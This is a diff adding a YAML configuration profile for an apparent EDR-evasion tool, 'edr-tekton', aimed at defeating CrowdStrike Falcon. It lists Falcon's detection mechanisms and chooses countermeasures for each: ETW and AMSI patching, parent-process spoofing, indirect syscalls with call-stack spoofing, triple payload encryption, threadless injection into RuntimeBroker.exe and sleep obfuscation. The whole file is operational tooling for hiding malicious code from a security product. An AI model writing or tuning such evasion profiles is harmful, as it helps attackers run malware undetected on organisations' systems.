@@ -1,0 +1,142 @@
+# edr-tekton :: CrowdStrike Falcon Profile
+#
+# CrowdStrike Falcon is one of the most aggressive EDRs.
+# Strong kernel callbacks, ETW consumption, user-mode hooks
+# on ntdll, and real-time memory scanning. Their minifilter
+# (csagent.sys) sits at altitude 321410.
+#
+# Key detection strengths:
+#   - Kernel callbacks: PsSetCreateProcessNotifyRoutineEx,
+#     PsSetCreateThreadNotifyRoutine, PsSetLoadImageNotifyRoutine
+#   - Deep ntdll hooking with integrity checks
+#   - ETW consumer for Threat Intelligence provider
+#   - AMSI integration
+#   - Memory scanning on suspicious allocations
+#   - Call stack analysis on Nt* calls
+#
+# Strategy: indirect syscalls + call stack spoofing + sleep
+# encryption + minimal process interaction
+
+profile:
+  name: crowdstrike_falcon
+  display_name: "CrowdStrike Falcon"
+  version: "1.0"
+  vendor: crowdstrike
+
+# Per-layer threat assessment
+threat_levels:
+  user_hooks: critical     # Aggressive ntdll inline hooks + integrity
+  kernel_cb: critical      # Full callback suite, creator vs parent PID check
+  etw: high                # EtwTi consumer, PPL protected
+  minifilter: high         # csagent.sys altitude 321410
+  wfp: medium              # Network monitoring, less aggressive
+  scanner: high            # Real-time memory scanning
+  elam: high               # PPL-protected service
+  nirvana: low             # Not primary detection vector
+  hypervisor: none         # No hypervisor component
+
+# Pipeline stage selections
+stages:
+  fingerprint:
+    primary: auto
+    required: true
+
+  api_resolve:
+    primary: hash_resolve
+    fallbacks:
+      - peb_walk
+    required: true
+    max_risk: 20
+    notes: "CRC32B hashing avoids string detection of API names"
+
+  evasion_pre:
+    primary: etw_patch
+    fallbacks:
+      - etw_blind
+    required: true
+    max_risk: 30
+    additional:
+      - amsi_patch
+      - sandbox_detect
+      - ppid_spoof
+    notes: "ETW patching critical, CrowdStrike reads EtwTi heavily"
+
+  syscall_init:
+    primary: indirect_syscall
+    fallbacks:
+      - tampered_syscall
+      - direct_syscall
+    required: true
+    max_risk: 15
+    additional:
+      - ssn_resolve
+      - callstack_spoof
+    notes: "Indirect + call stack spoof mandatory, CrowdStrike checks return addresses"
+
+  decrypt:
+    primary: encrypt_triple
+    fallbacks:
+      - encrypt_aes
+      - encrypt_rc4
+    required: true
+    max_risk: 10
+
+  inject:
+    primary: inject_threadless
+    fallbacks:
+      - inject_poolparty
+      - inject_callback
+      - inject_module_stomp
+    required: true
+    max_risk: 25
+    notes: "Threadless preferred, avoids thread creation callbacks"
+
+  sleep_init:
+    primary: sleep_zilean
+    fallbacks:
+      - sleep_foliage
+      - sleep_ekko
+    required: false
+    max_risk: 15
+    additional:
+      - sleep_beacongate
+    notes: "Zilean (NtContinue) cleanest stack, CrowdStrike inspects timer objects"
+
+  cleanup:
+    primary: auto
+    required: false
+
+# Global constraints
+constraints:
+  max_total_risk: 120
+  prefer_stealthy: true
+  require_x64: true
+  min_os_build: 17763      # Win10 1809+
+
+# Sleep configuration
+sleep:
+  interval_ms: 8000
+  encrypt: true
+
+# Encryption layers (outer to inner)
+encryption:
+  layers:
+    - type: aes256
+      key_source: env
+    - type: rc4
+      key_source: derived
+    - type: xor
+      key_source: static
+
+# Injection target
+inject_target: "RuntimeBroker.exe"
+
+# PPID spoofing
+ppid_parent: "svchost.exe"
+
+notes: >
+  CrowdStrike Falcon requires maximum stealth across all layers.
+  Indirect syscalls with call stack spoofing are mandatory due to
+  return address validation. Threadless injection avoids kernel
+  thread creation callbacks. Zilean sleep produces the cleanest
+  call stacks. Triple encryption defeats memory scanning.
